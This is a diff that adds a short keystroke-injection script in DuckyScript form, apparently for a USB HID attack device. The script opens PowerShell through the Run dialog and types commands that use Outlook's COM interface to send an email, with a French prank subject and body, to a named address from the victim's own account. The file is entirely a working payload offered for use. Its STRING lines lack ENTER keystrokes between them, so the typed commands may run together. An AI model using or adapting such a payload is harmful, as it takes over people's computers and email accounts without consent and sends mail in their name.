@@ -1,0 +1,12 @@
+DELAY 750
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 750
+STRING $Outlook = New-Object -ComObject Outlook.Application
+STRING $Mail = $Outlook.CreateItem(0)
+STRING $Mail.To = "rchatti@jw.org"
+STRING $Mail.Subject = "Surprise surprenante"
+STRING $Mail.Body ="Snickers pour Florian!"
+STRING $Mail.Send()
